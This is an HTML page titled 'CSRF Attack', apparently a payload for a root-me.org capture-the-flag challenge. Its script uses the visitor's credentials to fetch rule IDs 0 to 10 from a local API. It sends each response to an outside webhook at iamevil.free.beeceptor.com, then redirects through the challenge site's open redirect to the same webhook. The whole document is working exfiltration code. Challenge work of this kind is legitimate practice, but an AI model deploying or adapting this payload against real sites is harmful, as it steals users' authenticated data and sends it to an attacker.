<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack</title>
</head>
<body>
    <script>
        // Try all possible rule IDs including potential hidden ones
        for (var i = 0; i <= 10; i++) {
            fetch('http://127.0.0.1:58039/api/rules/' + i, {
                credentials: 'include'
            })
            .then(response => response.text())
            .then(data => {
                // Send each rule's content to our server
                fetch('https://iamevil.free.beeceptor.com/rule?id=' + i + '&content=' + encodeURIComponent(data))
                .catch(() => {}); // Ignore fetch errors to webhook
            })
            .catch(() => {}); // Ignore rule fetch errors
        }
        
        // Ensure redirect happens regardless
        setTimeout(function() {
            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/tried_all_rules';
        }, 2000);
    </script>
</body>
</html>
